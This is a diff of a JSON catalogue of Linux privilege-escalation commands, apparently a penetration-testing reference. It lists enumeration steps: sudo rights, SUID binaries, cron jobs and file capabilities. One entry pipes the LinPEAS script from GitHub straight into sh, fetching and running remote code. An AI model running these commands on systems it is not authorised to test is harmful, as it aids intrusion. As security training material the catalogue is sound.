@@ -3,7 +3,12 @@
     "id": "linux-sudo-l",
     "tool": "sudo",
     "category": "Linux Privilege Escalation",
-    "scenario_tags": ["linux", "privesc", "enumeration", "sudo"],
+    "scenario_tags": [
+      "linux",
+      "privesc",
+      "enumeration",
+      "sudo"
+    ],
     "platform": "linux",
     "title": "Check Sudo Permissions",
     "command": "sudo -l",
@@ -22,7 +27,12 @@
     "id": "linux-suid-search",
     "tool": "find",
     "category": "Linux Privilege Escalation",
-    "scenario_tags": ["linux", "privesc", "enumeration", "suid"],
+    "scenario_tags": [
+      "linux",
+      "privesc",
+      "enumeration",
+      "suid"
+    ],
     "platform": "linux",
     "title": "Search for SUID Binaries",
     "command": "find / -perm -u=s -type f 2>/dev/null",
@@ -35,7 +45,12 @@
     "id": "linux-cron-jobs",
     "tool": "cat",
     "category": "Linux Privilege Escalation",
-    "scenario_tags": ["linux", "privesc", "enumeration", "cron"],
+    "scenario_tags": [
+      "linux",
+      "privesc",
+      "enumeration",
+      "cron"
+    ],
     "platform": "linux",
     "title": "View System Cron Jobs",
     "command": "cat /etc/crontab\nls -la /etc/cron.d/",
@@ -47,7 +62,12 @@
     "id": "linux-capabilities",
     "tool": "getcap",
     "category": "Linux Privilege Escalation",
-    "scenario_tags": ["linux", "privesc", "enumeration", "capabilities"],
+    "scenario_tags": [
+      "linux",
+      "privesc",
+      "enumeration",
+      "capabilities"
+    ],
     "platform": "linux",
     "title": "Search for File Capabilities",
     "command": "getcap -r / 2>/dev/null",
@@ -60,7 +80,11 @@
     "id": "linpeas-all",
     "tool": "LinPEAS",
     "category": "Linux Privilege Escalation",
-    "scenario_tags": ["linux", "privesc", "automation"],
+    "scenario_tags": [
+      "linux",
+      "privesc",
+      "automation"
+    ],
     "platform": "linux",
     "title": "Run Full LinPEAS Scan",
     "command": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
@@ -68,6 +92,8 @@
     "when_to_use": "The gold standard for automated enumeration. Run this to check for vulnerable kernel versions, misconfigured NFS shares, plaintext passwords in config files, and much more.",
     "example": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
     "common_pitfalls": "Executing scripts directly from the internet via 'curl | sh' is extremely loud and easily blocked or flagged by enterprise EDR solutions.",
-    "related_ids": ["win-winpeas-all"]
+    "related_ids": [
+      "win-winpeas-all"
+    ]
   }
 ]
